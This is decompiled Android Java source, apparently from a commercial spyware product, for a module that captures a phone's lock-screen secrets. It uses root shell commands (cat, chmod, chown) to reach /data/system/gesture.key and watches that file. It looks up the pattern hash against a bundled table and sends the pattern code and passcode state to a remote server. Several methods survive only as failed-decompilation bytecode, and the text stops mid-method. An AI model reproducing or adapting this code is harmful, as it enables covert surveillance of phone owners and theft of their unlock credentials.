package com.vvt.capture.d.a;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.datadeliverymanager.i;
import com.vvt.io.p;
import com.vvt.phoenix.prot.command.data.j;
import com.vvt.phoenix.prot.command.z;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.Timer;

public class a
  implements com.vvt.datadeliverymanager.a.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private RunningMode d;
  private String e;
  private com.vvt.capture.d.a.a.a f;
  private com.vvt.capture.d.a.a.b g;
  private Thread h = null;
  private com.vvt.datadeliverymanager.b i;
  private Timer j;
  private int k;
  private com.vvt.datadeliverymanager.a.a l;
  private com.vvt.n.a.b m;
  private boolean n = false;
  private String o = "root";
  
  public a(RunningMode paramRunningMode, String paramString1, com.vvt.datadeliverymanager.b paramb, com.vvt.n.a.b paramb1, Context paramContext, String paramString2)
  {
    this.i = paramb;
    this.d = paramRunningMode;
    this.e = paramString1;
    this.m = paramb1;
    this.o = paramString2;
  }
  
  private void a(z paramz)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    String str = null;
    boolean bool3 = a;
    if (bool3) {}
    Object localObject1 = this.d;
    Object localObject2 = RunningMode.NORMAL;
    if (localObject1 == localObject2)
    {
      bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return;
    }
    j localj = new com/vvt/phoenix/prot/command/data/j;
    localj.<init>();
    localObject1 = "General.PasscodeLock.IsPasscodeOn";
    localj.a((String)localObject1);
    long l1 = n();
    long l2 = 0L;
    bool3 = l1 < l2;
    label101:
    boolean bool4;
    if (bool3)
    {
      bool3 = bool1;
      bool4 = a;
      if (bool4) {}
      localObject2 = "";
      if (!bool3) {
        break label390;
      }
      localObject1 = h();
      bool4 = com.vvt.ag.b.a((String)localObject1);
      if (bool4) {
        break label270;
      }
    }
    for (;;)
    {
      bool2 = f();
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if ((!bool4) || (bool1))
      {
        localj.b("1");
        paramz.a(localj);
        localObject3 = new com/vvt/phoenix/prot/command/data/j;
        ((j)localObject3).<init>();
        str = "General.PasscodeLock.PatternCode";
        ((j)localObject3).a(str);
        ((j)localObject3).b((String)localObject1);
        paramz.a((j)localObject3);
        localObject1 = new com/vvt/phoenix/prot/command/data/j;
        ((j)localObject1).<init>();
        ((j)localObject1).a("General.PasscodeLock.Passcode");
        localObject3 = "";
        ((j)localObject1).b((String)localObject3);
        paramz.a((j)localObject1);
        break;
        bool3 = false;
        localObject1 = null;
        break label101;
        label270:
        bool1 = false;
        localObject3 = null;
        continue;
      }
      if (bool2)
      {
        localObject1 = "1";
        localj.b((String)localObject1);
        paramz.a(localj);
        break;
      }
      if ((bool1) || (bool2)) {
        break;
      }
      localj.b("0");
      paramz.a(localj);
      localObject1 = new com/vvt/phoenix/prot/command/data/j;
      ((j)localObject1).<init>();
      ((j)localObject1).a("General.PasscodeLock.PatternCode");
      ((j)localObject1).b("");
      paramz.a((j)localObject1);
      localObject1 = new com/vvt/phoenix/prot/command/data/j;
      ((j)localObject1).<init>();
      ((j)localObject1).a("General.PasscodeLock.Passcode");
      Object localObject3 = "";
      ((j)localObject1).b((String)localObject3);
      paramz.a((j)localObject1);
      break;
      label390:
      localObject1 = localObject2;
      bool1 = false;
      localObject3 = null;
    }
  }
  
  private boolean a(String paramString1, String paramString2, String paramString3)
  {
    for (bool1 = true;; bool1 = false) {
      try
      {
        boolean bool2 = ShellUtil.b(paramString1);
        if (bool2)
        {
          String str1 = "cat %s > %s";
          int i1 = 2;
          Object[] arrayOfObject = new Object[i1];
          int i4 = 0;
          arrayOfObject[0] = paramString1;
          i4 = 1;
          arrayOfObject[i4] = paramString2;
          str1 = String.format(str1, arrayOfObject);
          boolean bool3 = a;
          if (bool3) {}
          KMShell.a(str1);
          str1 = "chmod %s %s";
          int i2 = 2;
          arrayOfObject = new Object[i2];
          i4 = 0;
          arrayOfObject[0] = paramString3;
          i4 = 1;
          arrayOfObject[i4] = paramString2;
          str1 = String.format(str1, arrayOfObject);
          boolean bool4 = a;
          if (bool4) {}
          KMShell.a(str1);
          str1 = "chown %s.%s %s";
          int i3 = 3;
          arrayOfObject = new Object[i3];
          i4 = 0;
          String str2 = this.o;
          arrayOfObject[0] = str2;
          i4 = 1;
          str2 = this.o;
          arrayOfObject[i4] = str2;
          i4 = 2;
          arrayOfObject[i4] = paramString2;
          str1 = String.format(str1, arrayOfObject);
          boolean bool5 = a;
          if (bool5) {}
          KMShell.a(str1);
          bool2 = com.vvt.aa.a.c();
          if (bool2) {
            ShellUtil.k(paramString2);
          }
          return bool1;
        }
        bool1 = b;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool1 = c;
          if (!bool1) {}
        }
      }
    }
  }
  
  private void k()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/io/File;
    Object localObject2 = "/data/system/gesture.key";
    ((File)localObject1).<init>((String)localObject2);
    boolean bool2 = ((File)localObject1).exists();
    if (!bool2)
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      try
      {
        bool1 = ((File)localObject1).createNewFile();
        bool2 = a;
        if ((!bool2) || (bool1))
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = "chown system.system %s";
          bool2 = true;
          localObject2 = new Object[bool2];
          String str = "/data/system/gesture.key";
          localObject2[0] = str;
          localObject1 = String.format((String)localObject1, (Object[])localObject2);
          KMShell.a((String)localObject1);
        }
      }
      catch (Exception localException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private com.vvt.n.a.a l()
  {
    b localb = new com/vvt/capture/d/a/b;
    localb.<init>(this);
    return localb;
  }
  
  private com.vvt.capture.d.a.a.a m()
  {
    d locald = new com/vvt/capture/d/a/d;
    locald.<init>(this);
    return locald;
  }
  
  /* Error */
  private long n()
  {
    // Byte code:
    //   0: lconst_0
    //   1: lstore_1
    //   2: aconst_null
    //   3: astore_3
    //   4: invokestatic 168	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   7: astore 4
    //   9: ldc -86
    //   11: astore_3
    //   12: iconst_2
    //   13: istore 5
    //   15: iload 5
    //   17: anewarray 4	java/lang/Object
    //   20: astore 6
    //   22: iconst_0
    //   23: istore 7
    //   25: aconst_null
    //   26: astore 8
    //   28: ldc -84
    //   30: astore 9
    //   32: aload 6
    //   34: iconst_0
    //   35: aload 9
    //   37: aastore
    //   38: iconst_1
    //   39: istore 7
    //   41: ldc -111
    //   43: astore 9
    //   45: aload 6
    //   47: iload 7
    //   49: aload 9
    //   51: aastore
    //   52: aload_3
    //   53: aload 6
    //   55: invokestatic 123	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   58: astore_3
    //   59: aload 4
    //   61: aload_3
    //   62: invokevirtual 173	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   65: astore_3
    //   66: new 175	java/io/BufferedReader
    //   69: astore 6
    //   71: new 177	java/io/StringReader
    //   74: astore 8
    //   76: aload 8
    //   78: aload_3
    //   79: invokespecial 178	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   82: aload 6
    //   84: aload 8
    //   86: invokespecial 181	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   89: aload 6
    //   91: invokevirtual 184	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   94: astore_3
    //   95: aload_3
    //   96: ifnull +118 -> 214
    //   99: aload_3
    //   100: invokestatic 189	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   103: astore_3
    //   104: aload_3
    //   105: ifnull -16 -> 89
    //   108: aload_3
    //   109: getfield 193	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   112: istore 7
    //   114: iload 7
    //   116: ifne -27 -> 89
    //   119: aload_3
    //   120: getfield 194	com/vvt/io/MyUncaughtExceptionHandler:e	Ljava/lang/String;
    //   123: astore_3
    //   124: aload_3
    //   125: invokestatic 200	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   128: lstore 10
    //   130: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   133: istore 12
    //   135: iload 12
    //   137: ifeq +3 -> 140
    //   140: aload 4
    //   142: ifnull +8 -> 150
    //   145: aload 4
    //   147: invokevirtual 202	com/vvt/shell/f:d	()V
    //   150: lload 10
    //   152: lreturn
    //   153: astore 6
    //   155: aconst_null
    //   156: astore 4
    //   158: lload_1
    //   159: lstore 10
    //   161: getstatic 45	com/vvt/capture/d/a/a:MyUncaughtExceptionHandler	Z
    //   164: istore 12
    //   166: iload 12
    //   168: ifeq +3 -> 171
    //   171: aload 4
    //   173: ifnull -23 -> 150
    //   176: goto -31 -> 145
    //   179: astore 6
    //   181: aconst_null
    //   182: astore 4
    //   184: aload 6
    //   186: astore_3
    //   187: aload 4
    //   189: ifnull +8 -> 197
    //   192: aload 4
    //   194: invokevirtual 202	com/vvt/shell/f:d	()V
    //   197: aload_3
    //   198: athrow
    //   199: astore_3
    //   200: goto -13 -> 187
    //   203: astore_3
    //   204: lload_1
    //   205: lstore 10
    //   207: goto -46 -> 161
    //   210: pop
    //   211: goto -50 -> 161
    //   214: lload_1
    //   215: lstore 10
    //   217: goto -77 -> 140
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	220	0	this	a
    //   1	214	1	l1	long
    //   3	195	3	localObject1	Object
    //   199	1	3	localObject2	Object
    //   203	1	3	localException1	Exception
    //   7	186	4	localf	com.vvt.shell.f
    //   13	3	5	i1	int
    //   20	70	6	localObject3	Object
    //   153	1	6	localException2	Exception
    //   179	6	6	localObject4	Object
    //   23	92	7	i2	int
    //   26	59	8	localStringReader	java.io.StringReader
    //   30	20	9	str	String
    //   128	88	10	l2	long
    //   133	34	12	bool	boolean
    //   210	1	15	localException3	Exception
    // Exception table:
    //   from	to	target	type
    //   4	7	153	java/lang/Exception
    //   4	7	179	finally
    //   15	20	199	finally
    //   35	38	199	finally
    //   49	52	199	finally
    //   53	58	199	finally
    //   61	65	199	finally
    //   66	69	199	finally
    //   71	74	199	finally
    //   78	82	199	finally
    //   84	89	199	finally
    //   89	94	199	finally
    //   99	103	199	finally
    //   108	112	199	finally
    //   119	123	199	finally
    //   124	128	199	finally
    //   130	133	199	finally
    //   161	164	199	finally
    //   15	20	203	java/lang/Exception
    //   35	38	203	java/lang/Exception
    //   49	52	203	java/lang/Exception
    //   53	58	203	java/lang/Exception
    //   61	65	203	java/lang/Exception
    //   66	69	203	java/lang/Exception
    //   71	74	203	java/lang/Exception
    //   78	82	203	java/lang/Exception
    //   84	89	203	java/lang/Exception
    //   89	94	203	java/lang/Exception
    //   99	103	203	java/lang/Exception
    //   108	112	203	java/lang/Exception
    //   119	123	203	java/lang/Exception
    //   124	128	203	java/lang/Exception
    //   130	133	210	java/lang/Exception
  }
  
  private boolean o()
  {
    Object localObject1 = p();
    String str = p.a(this.e, "gesture_hash.zip");
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool1 = ((File)localObject2).exists();
    if (bool1) {
      bool1 = true;
    }
    for (;;)
    {
      return bool1;
      localObject1 = new java/io/File;
      ((File)localObject1).<init>(str);
      bool1 = ((File)localObject1).exists();
      if (bool1)
      {
        localObject1 = r();
        localObject2 = File.separator;
        boolean bool2 = ((String)localObject1).endsWith((String)localObject2);
        if (!bool2)
        {
          localObject2 = new java/lang/StringBuilder;
          ((StringBuilder)localObject2).<init>();
          localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
          localObject2 = File.separator;
          localObject1 = (String)localObject2;
        }
        localObject2 = new com/vvt/io/a;
        ((com.vvt.io.a)localObject2).<init>(str, (String)localObject1);
        bool1 = ((com.vvt.io.a)localObject2).a();
      }
      else
      {
        bool1 = c;
        if (bool1) {}
        bool1 = false;
        localObject1 = null;
      }
    }
  }
  
  private String p()
  {
    return p.a(r(), "gesture_hash.txt");
  }
  
  private String q()
  {
    return p.a(this.e, "busybox");
  }
  
  private String r()
  {
    return p.a(this.e, "patternman");
  }
  
  private void s()
  {
    String str1 = r();
    String str2 = "rm -r %s";
    int i1 = 1;
    try
    {
      Object[] arrayOfObject = new Object[i1];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    com.vvt.datadeliverymanager.b localb = this.i;
    if (localb == null)
    {
      bool = c;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localb = this.i;
      int i1 = 46;
      localb.a(i1, this);
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
  }
  
  public void b(i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = this.l;
    if (localObject != null)
    {
      localObject = this.l;
      ((com.vvt.datadeliverymanager.a.a)localObject).b(parami);
    }
    if (parami == null)
    {
      bool1 = c;
      if (!bool1) {}
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (bool1) {}
      bool1 = parami.f();
      boolean bool4;
      if (!bool1)
      {
        int i1 = parami.d();
        int i4 = 306;
        if (i1 != i4)
        {
          i1 = parami.d();
          i4 = 312;
          if (i1 != i4) {}
        }
        else
        {
          boolean bool2 = a;
          if (bool2) {}
          int i2 = this.k + 1;
          this.k = i2;
          boolean bool3 = a;
          if (bool3) {}
          int i3 = this.k;
          i4 = 15;
          if (i3 < i4)
          {
            bool4 = a;
            if (bool4) {}
            localObject = this.j;
            if (localObject != null)
            {
              localObject = this.j;
              ((Timer)localObject).cancel();
            }
            bool4 = a;
            if (bool4) {}
            localObject = new java/util/Timer;
            ((Timer)localObject).<init>();
            this.j = ((Timer)localObject);
            localObject = this.j;
            f localf = new com/vvt/capture/d/a/f;
            localf.<init>(this, null);
            long l1 = 60000L;
            ((Timer)localObject).schedule(localf, l1);
            continue;
          }
          bool4 = a;
          if (bool4) {}
          this.k = 0;
          continue;
        }
        bool4 = a;
        if (bool4) {}
        this.k = 0;
      }
      else
      {
        bool4 = a;
        if (bool4) {}
        this.k = 0;
      }
    }
  }
  
  public boolean b()
  {
    boolean bool1 = com.vvt.aa.a.a();
    if (bool1) {}
    for (bool1 = false;; bool1 = true)
    {
      boolean bool2 = a;
      if (bool2) {}
      return bool1;
    }
  }
  
  public void c()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.n;
    Object localObject1;
    Object localObject2;
    Object localObject3;
    if (!bool)
    {
      this.n = true;
      bool = a;
      if (bool) {}
      localObject1 = this.d;
      localObject2 = RunningMode.FULL;
      if (localObject1 != localObject2) {
        break label118;
      }
      localObject1 = this.g;
      if (localObject1 == null)
      {
        k();
        localObject1 = m();
        this.f = ((com.vvt.capture.d.a.a.a)localObject1);
        localObject1 = new com/vvt/capture/d/a/a/b;
        localObject2 = "/data/system/gesture.key";
        localObject3 = this.f;
        ((com.vvt.capture.d.a.a.b)localObject1).<init>((String)localObject2, (com.vvt.capture.d.a.a.a)localObject3);
        this.g = ((com.vvt.capture.d.a.a.b)localObject1);
        localObject1 = this.g;
        ((com.vvt.capture.d.a.a.b)localObject1).startWatching();
        bool = a;
        if (!bool) {}
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      label118:
      localObject1 = this.d;
      localObject2 = RunningMode.LIMITED_1;
      if (localObject1 == localObject2)
      {
        bool = a;
        if (bool) {}
        localObject1 = this.m;
        localObject2 = "/data/system/gesture.key";
        localObject3 = l();
        ((com.vvt.n.a.b)localObject1).a((String)localObject2, (com.vvt.n.a.a)localObject3);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.n;
    if (bool)
    {
      bool = false;
      this.n = false;
      com.vvt.capture.d.a.a.b localb = this.g;
      if (localb != null)
      {
        bool = a;
        if (bool) {}
        localb = this.g;
        localb.stopWatching();
      }
      this.g = null;
      this.f = null;
    }
    bool = a;
    if (bool) {}
  }
  
  public void e()
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = b();
    if (bool2)
    {
      Object localObject = new com/vvt/phoenix/prot/command/z;
      ((z)localObject).<init>();
      a((z)localObject);
      h localh = new com/vvt/datadeliverymanager/h;
      localh.<init>();
      int i1 = 46;
      localh.a(i1);
      localh.a((com.vvt.phoenix.prot.command.b)localObject);
      localObject = DeliveryRequestType.REQUEST_TYPE_NEW;
      localh.a((DeliveryRequestType)localObject);
      localObject = PriorityRequest.PRIORITY_NORMAL;
      localh.a((PriorityRequest)localObject);
      localObject = DataProviderType.DATA_PROVIDER_TYPE_NONE;
      localh.a((DataProviderType)localObject);
      localh.c(15);
      long l1 = 60000L;
      localh.b(l1);
      localh.c(bool1);
      localh.b(bool1);
      localh.a(this);
      localObject = this.i;
      ((com.vvt.datadeliverymanager.b)localObject).a(localh);
      bool2 = a;
      if (!bool2) {}
    }
    bool2 = a;
    if (bool2) {}
  }
  
  /* Error */
  public boolean f()
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_1
    //   2: ldc 66
    //   4: fstore_2
    //   5: iconst_0
    //   6: istore_3
    //   7: aload_0
    //   8: getfield 61	com/vvt/capture/d/a/a:d	Lcom/vvt/base/RunningMode;
    //   11: astore 4
    //   13: getstatic 71	com/vvt/base/RunningMode:NORMAL	Lcom/vvt/base/RunningMode;
    //   16: astore 5
    //   18: aload 4
    //   20: aload 5
    //   22: if_acmpne +24 -> 46
    //   25: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   28: istore 6
    //   30: iload 6
    //   32: ifeq +485 -> 517
    //   35: iconst_0
    //   36: istore 6
    //   38: aconst_null
    //   39: astore 4
    //   41: iload 6
    //   43: istore_3
    //   44: iload_3
    //   45: ireturn
    //   46: aload_0
    //   47: getfield 61	com/vvt/capture/d/a/a:d	Lcom/vvt/base/RunningMode;
    //   50: astore 4
    //   52: getstatic 315	com/vvt/base/RunningMode:LIMITED_1	Lcom/vvt/base/RunningMode;
    //   55: astore 5
    //   57: aload 4
    //   59: aload 5
    //   61: if_acmpne +55 -> 116
    //   64: aload_0
    //   65: getfield 63	com/vvt/capture/d/a/a:e	Ljava/lang/String;
    //   68: ldc_w 386
    //   71: invokestatic 212	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   74: astore 4
    //   76: ldc_w 388
    //   79: astore 5
    //   81: ldc_w 390
    //   84: astore 7
    //   86: aload_0
    //   87: aload 5
    //   89: aload 4
    //   91: aload 7
    //   93: invokespecial 393	com/vvt/capture/d/a/a:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    //   96: istore 8
    //   98: iload 8
    //   100: ifne +21 -> 121
    //   103: getstatic 41	com/vvt/capture/d/a/a:removeFromPath	Z
    //   106: istore 6
    //   108: iload 6
    //   110: ifeq -66 -> 44
    //   113: goto -69 -> 44
    //   116: ldc_w 388
    //   119: astore 4
    //   121: aload 4
    //   123: invokestatic 114	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   126: istore 8
    //   128: iload 8
    //   130: ifeq +387 -> 517
    //   133: iconst_0
    //   134: istore 9
    //   136: aconst_null
    //   137: astore 7
    //   139: invokestatic 399	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   142: astore 10
    //   144: new 401	java/io/FileInputStream
    //   147: astore 5
    //   149: aload 5
    //   151: aload 4
    //   153: invokespecial 402	java/io/FileInputStream:<init>	(Ljava/lang/String;)V
    //   156: aload 10
    //   158: invokevirtual 406	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   161: astore 4
    //   163: new 408	org/xml/sax/InputSource
    //   166: astore 7
    //   168: aload 7
    //   170: aload 5
    //   172: invokespecial 411	org/xml/sax/InputSource:<init>	(Ljava/io/InputStream;)V
    //   175: aload 4
    //   177: aload 7
    //   179: invokevirtual 417	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   182: astore 4
    //   184: aload 4
    //   186: invokeinterface 423 1 0
    //   191: astore 7
    //   193: aload 7
    //   195: invokeinterface 428 1 0
    //   200: ldc_w 430
    //   203: astore 7
    //   205: aload 4
    //   207: aload 7
    //   209: invokeinterface 434 2 0
    //   214: astore 4
    //   216: aload 4
    //   218: invokeinterface 439 1 0
    //   223: istore 9
    //   225: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   228: istore 11
    //   230: iload 11
    //   232: ifeq +3 -> 235
    //   235: iload 9
    //   237: ifle +271 -> 508
    //   240: iconst_0
    //   241: istore 9
    //   243: aconst_null
    //   244: astore 7
    //   246: aload 4
    //   248: iconst_0
    //   249: invokeinterface 443 2 0
    //   254: astore 4
    //   256: aload 4
    //   258: invokeinterface 449 1 0
    //   263: astore 4
    //   265: ldc_w 451
    //   268: astore 7
    //   270: aload 4
    //   272: aload 7
    //   274: invokeinterface 457 2 0
    //   279: astore 7
    //   281: aload 7
    //   283: invokeinterface 460 1 0
    //   288: astore 7
    //   290: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   293: istore 11
    //   295: iload 11
    //   297: ifeq +3 -> 300
    //   300: ldc_w 462
    //   303: astore 10
    //   305: aload 4
    //   307: aload 10
    //   309: invokeinterface 457 2 0
    //   314: astore 10
    //   316: aload 10
    //   318: invokeinterface 460 1 0
    //   323: astore 10
    //   325: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   328: istore 12
    //   330: iload 12
    //   332: ifeq +3 -> 335
    //   335: ldc_w 464
    //   338: astore 13
    //   340: aload 4
    //   342: aload 13
    //   344: invokeinterface 457 2 0
    //   349: astore 4
    //   351: aload 4
    //   353: invokeinterface 460 1 0
    //   358: astore 4
    //   360: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   363: istore 12
    //   365: iload 12
    //   367: ifeq +3 -> 370
    //   370: aload 4
    //   372: invokestatic 92	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   375: istore 12
    //   377: iload 12
    //   379: ifne +25 -> 404
    //   382: ldc 110
    //   384: astore 13
    //   386: aload 4
    //   388: aload 13
    //   390: if_acmpeq +14 -> 404
    //   393: iload_1
    //   394: istore 6
    //   396: aload 5
    //   398: invokestatic 468	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   401: goto -360 -> 41
    //   404: aload 7
    //   406: invokestatic 92	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   409: istore 6
    //   411: iload 6
    //   413: ifne +95 -> 508
    //   416: ldc 110
    //   418: astore 4
    //   420: aload 7
    //   422: aload 4
    //   424: if_acmpeq +84 -> 508
    //   427: aload 10
    //   429: invokestatic 92	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   432: istore 6
    //   434: iload 6
    //   436: ifne +72 -> 508
    //   439: ldc 110
    //   441: astore 4
    //   443: aload 10
    //   445: aload 4
    //   447: if_acmpeq +61 -> 508
    //   450: iload_1
    //   451: istore 6
    //   453: goto -57 -> 396
    //   456: astore 4
    //   458: iconst_0
    //   459: istore 6
    //   461: aconst_null
    //   462: astore 4
    //   464: aload 4
    //   466: invokestatic 468	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   469: iconst_0
    //   470: istore 6
    //   472: aconst_null
    //   473: astore 4
    //   475: goto -434 -> 41
    //   478: astore 4
    //   480: iconst_0
    //   481: istore 8
    //   483: aconst_null
    //   484: astore 5
    //   486: aload 5
    //   488: invokestatic 468	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   491: aload 4
    //   493: athrow
    //   494: astore 4
    //   496: goto -10 -> 486
    //   499: astore 4
    //   501: aload 5
    //   503: astore 4
    //   505: goto -41 -> 464
    //   508: iconst_0
    //   509: istore 6
    //   511: aconst_null
    //   512: astore 4
    //   514: goto -118 -> 396
    //   517: iconst_0
    //   518: istore 6
    //   520: aconst_null
    //   521: astore 4
    //   523: goto -482 -> 41
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	526	0	this	a
    //   1	450	1	bool1	boolean
    //   4	1	2	f1	float
    //   6	39	3	bool2	boolean
    //   11	435	4	localObject1	Object
    //   456	1	4	localException1	Exception
    //   462	12	4	localInputStream	java.io.InputStream
    //   478	14	4	localObject2	Object
    //   494	1	4	localObject3	Object
    //   499	1	4	localException2	Exception
    //   503	19	4	localObject4	Object
    //   16	486	5	localObject5	Object
    //   28	491	6	bool3	boolean
    //   84	337	7	localObject6	Object
    //   96	386	8	bool4	boolean
    //   134	108	9	i1	int
    //   142	302	10	localObject7	Object
    //   228	68	11	bool5	boolean
    //   328	50	12	bool6	boolean
    //   338	51	13	str	String
    // Exception table:
    //   from	to	target	type
    //   144	147	456	java/lang/Exception
    //   151	156	456	java/lang/Exception
    //   144	147	478	finally
    //   151	156	478	finally
    //   156	161	494	finally
    //   163	166	494	finally
    //   170	175	494	finally
    //   177	182	494	finally
    //   184	191	494	finally
    //   193	200	494	finally
    //   207	214	494	finally
    //   216	223	494	finally
    //   225	228	494	finally
    //   248	254	494	finally
    //   256	263	494	finally
    //   272	279	494	finally
    //   281	288	494	finally
    //   290	293	494	finally
    //   307	314	494	finally
    //   316	323	494	finally
    //   325	328	494	finally
    //   342	349	494	finally
    //   351	358	494	finally
    //   360	363	494	finally
    //   370	375	494	finally
    //   404	409	494	finally
    //   427	432	494	finally
    //   156	161	499	java/lang/Exception
    //   163	166	499	java/lang/Exception
    //   170	175	499	java/lang/Exception
    //   177	182	499	java/lang/Exception
    //   184	191	499	java/lang/Exception
    //   193	200	499	java/lang/Exception
    //   207	214	499	java/lang/Exception
    //   216	223	499	java/lang/Exception
    //   225	228	499	java/lang/Exception
    //   248	254	499	java/lang/Exception
    //   256	263	499	java/lang/Exception
    //   272	279	499	java/lang/Exception
    //   281	288	499	java/lang/Exception
    //   290	293	499	java/lang/Exception
    //   307	314	499	java/lang/Exception
    //   316	323	499	java/lang/Exception
    //   325	328	499	java/lang/Exception
    //   342	349	499	java/lang/Exception
    //   351	358	499	java/lang/Exception
    //   360	363	499	java/lang/Exception
    //   370	375	499	java/lang/Exception
    //   404	409	499	java/lang/Exception
    //   427	432	499	java/lang/Exception
  }
  
  public boolean g()
  {
    long l1 = n();
    long l2 = 0L;
    boolean bool = l1 < l2;
    if (bool) {}
    for (bool = true;; bool = false) {
      return bool;
    }
  }
  
  /* Error */
  public String h()
  {
    // Byte code:
    //   0: ldc 84
    //   2: astore_1
    //   3: aload_0
    //   4: invokespecial 471	com/vvt/capture/d/a/a:q	()Ljava/lang/String;
    //   7: astore_2
    //   8: aload_0
    //   9: invokespecial 205	com/vvt/capture/d/a/a:p	()Ljava/lang/String;
    //   12: astore_3
    //   13: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   16: istore 4
    //   18: iload 4
    //   20: ifeq +3 -> 23
    //   23: aload_0
    //   24: getfield 61	com/vvt/capture/d/a/a:d	Lcom/vvt/base/RunningMode;
    //   27: astore 5
    //   29: getstatic 71	com/vvt/base/RunningMode:NORMAL	Lcom/vvt/base/RunningMode;
    //   32: astore 6
    //   34: aload 5
    //   36: aload 6
    //   38: if_acmpne +19 -> 57
    //   41: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   44: istore 7
    //   46: iload 7
    //   48: ifeq +3 -> 51
    //   51: aload_0
    //   52: invokespecial 474	com/vvt/capture/d/a/a:s	()V
    //   55: aload_1
    //   56: areturn
    //   57: new 143	java/io/File
    //   60: astore 5
    //   62: aload 5
    //   64: aload_3
    //   65: invokespecial 147	java/io/File:<init>	(Ljava/lang/String;)V
    //   68: aload 5
    //   70: invokevirtual 150	java/io/File:exists	()Z
    //   73: istore 4
    //   75: iload 4
    //   77: ifne +18 -> 95
    //   80: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   83: istore 4
    //   85: iload 4
    //   87: ifeq +3 -> 90
    //   90: aload_0
    //   91: invokespecial 476	com/vvt/capture/d/a/a:o	()Z
    //   94: pop
    //   95: new 143	java/io/File
    //   98: astore 5
    //   100: aload 5
    //   102: aload_3
    //   103: invokespecial 147	java/io/File:<init>	(Ljava/lang/String;)V
    //   106: aload 5
    //   108: invokevirtual 150	java/io/File:exists	()Z
    //   111: istore 4
    //   113: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   116: istore 8
    //   118: iload 8
    //   120: ifeq +3 -> 123
    //   123: iload 4
    //   125: ifeq +173 -> 298
    //   128: ldc_w 478
    //   131: astore 5
    //   133: ldc -14
    //   135: astore 6
    //   137: aload 5
    //   139: aload 6
    //   141: aload_2
    //   142: invokevirtual 482	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   145: astore 5
    //   147: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   150: istore 8
    //   152: iload 8
    //   154: ifeq +3 -> 157
    //   157: aload 5
